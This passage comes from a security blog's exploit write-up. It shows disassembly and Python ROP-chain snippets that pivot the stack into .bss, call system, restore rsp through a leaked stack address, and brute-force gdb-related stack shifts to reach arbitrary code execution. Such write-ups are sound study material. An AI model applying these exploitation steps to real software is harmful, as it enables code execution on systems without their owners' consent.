    0x730c037a000b:	movq   xmm14,QWORD PTR [rsp+0x60]
    0x730c037a0012:	movq   xmm15,QWORD PTR [rsp+0x68]
    0x730c037a0019:	add    rsp,0x70
    0x730c037a001d:	pop    rcx
    0x730c037a001e:	pop    rdx
    0x730c037a001f:	pop    rbx
    0x730c037a0020:	pop    rbp
    0x730c037a0021:	pop    rsi
    0x730c037a0022:	pop    r8
    0x730c037a0024:	pop    r9
    0x730c037a0026:	pop    r12
    0x730c037a0028:	pop    r13
    0x730c037a002a:	pop    r14
    0x730c037a002c:	pop    r15
    0x730c037a002e:	movq   xmm0,rax
    0x730c037a0033:	ret    
</code></pre><p>So if we were to pass the function call <code>call 0x730c03d62b00</code> and <code>rcx = 0</code>, then we reach <code>mov rsp, rbp</code>, where <code>rbp</code> can be a value of our choice if we decide to overwrite the old rbp! After <code>rsp</code> has been set, we can see that we have a lot of references to <code>rsp</code> in order to restore the registers. So in addition to our ROP - chain, we need to ensure that there is a region of size <code>0x70 + 11 * 0x8</code> of accessible memory. The content of the accessible memory region can be anything, although we could use it to make an initial setup for the registers. Right after that region, we can place our ROP - chain, as <code>rsp</code> will point to <code>rbp + 0x70 + 11 * 0x8 = rbp + 0xc8</code>. Once we hit the ROP - chain, we can continue as usual in order to set up a command for <code>system</code> etc.</p><p>Once we want to call <code>system</code> we need to restore the stack in order to make segmentation faults etc. less likely (remember that <code>rsp</code> is currently pointing to some globally accessible memory region, e.g. <code>.bss</code>. We do <strong>not</strong> want our stack to be there forever!). To that end we write the address of <code>system</code> to the stack pointer that was leaked by <code>lookupExamples</code>, set <code>rsp</code> to that address and call <code>pop rsp; ret</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Up to this point, rsp still points into .bss! This will most likely crash the app while calling system! Thus try to reset rsp by abusing the stack pointer leak. We will set rsp to the leaked address, but before we will set the stack value at that leaked address to system@libc! Thus we can use a pop rsp; ret gadget.</span>
</span></span><span class=line><span class=cl><span class=c1># Write address of system@got.plt to stack address. rdi currently contains the command string!</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_pop_rcx</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>address_stack</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_mov_deref_rcx_rax</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Restore stack</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_pop_rsp</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>address_stack</span>
</span></span></code></pre></div><p>There is only one problem remaining, i.e. when monitoring the exploit with <em>gdb</em>, we can observe that the ROP - chain might execute perfectly fine. But if we try to run the exploit without any debugger attached, it most likely does not work (at least in my case). There may be multiple reasons for that, among which the most probable ones are:</p><ol><li><em>gdb</em> shifts the stack, because it stores debug information or similar</li><li><em>gdb</em> prevents the app from using certain global variables s.t. overwriting them with <em>gdb</em> attached results in no error.</li></ol><p>It turns out that the first hypothesis is most likely true! To that end, we can try to brute - force over a finite set of possible stack shifts like so:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>address_old_rbp</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>leak</span><span class=p>[</span><span class=mi>4</span><span class=p>])</span> <span class=o>-</span> <span class=mh>0x240</span> <span class=o>+</span> <span class=mh>0x8</span> <span class=o>*</span> <span class=p>(</span><span class=n>rbp_shift</span><span class=p>))</span>
</span></span></code></pre></div><p>where</p><ul><li><code>leak[4]</code> is the stack address leak</li><li><code>- 0x240</code> is the offset of the leaked stack address to the address of the old <code>rbp</code> when <em>gdb</em> is attached</li><li><code>+ 0x8 * rbp_shift</code> shift to try for this run of the exploit. As we are &ldquo;missing&rdquo; <em>gdb</em>, it is very probable that there is less data on the stack, thus we increment the stack address.</li></ul><p>A big problem could be that both of the above reasons are true. Thus, minizing the ROP - chain we write into global memory can be very helpful to rule out the second reason as much as possible. E.g. we could use a ROP - chain that just calls <code>sleep(42)</code>. Then brute - force over all shifts until the app blocks. The shift that caused a block (longer than usual execution times, i.e. it might not block for all <code>42</code> seconds, because other threads might try to use overwritten global variables, which probably crashes the app!) is most likely the shift we were looking for.</p><h2 id=summary>Summary</h2><p>It has been a long journey to get to <em>arbitrary code execution</em>, but in the end it worked! We abused the fact that there are no bounds checks for <code>rsp</code>, which allowed for redirecting the stack into attacker - controlled memory regions. This again triggered the execution of a ROP - chain.</p><p>An upgrade to the above attack would be to use a single ROP - chain that triggers execution of <code>mmap</code> and stores the result in a writable memory region. Then, using the <em>Write - What - Where</em> condition, we could fill the new memory region with arbitrary shellcode. Finally, we can overwrite the return address to redirect control flow into the shellcode.</p></article></div></div></div></main><footer class="flex flex-none justify-center"><section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300"><div class="flex flex-row"></div><div class=grow></div><div class="flex flex-row"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-9 0a9 9 0 1018 0A9 9 0 103 12"/><path d="M14 9.75a3.016 3.016.0 00-4.163.173 2.993 2.993.0 000 4.154A3.016 3.016.0 0014 14.25"/></svg>
</i>2022 - 2024 lolcads</div><div class="flex flex-row"><span class="ml-0 pl-0 md:ml-2 md:pl-2 border-l-0 md:border-l border-slate-300 dark:border-slate-400">Powered by <a href=https://gohugo.io target=_blank rel=noopener class=underline>Hugo</a> <span class=text-red-600>&#9829;</span> <a href=https://github.com/tomowang/hugo-theme-tailwind target=_blank rel=noopener class=underline>Tailwind</a></span></div></section></footer><script src=/main.min.c6372b6836971865bd94bfde974748aca8415824a2facab6ccd66a87384bfacb.js></script><div class="hidden top-1 right-1" id=code-copy><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667A2.667 2.667.0 019.667 7h8.666A2.667 2.667.0 0121 9.667v8.666A2.667 2.667.0 0118.333 21H9.667A2.667 2.667.0 017 18.333z"/><path d="M4.012 16.737A2.005 2.005.0 013 15V5c0-1.1.9-2 2-2h10c.75.0 1.158.385 1.5 1"/></svg></i></div><div class="hidden top-1 right-1" id=code-copy-done><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12l5 5L20 7"/></svg></i></div><script src=/code-copy.min.e7b2a74adef1ed474c335c8bd5e7832b2316b8842b0f9184d65286c5bd64f51a.js></script></body></html>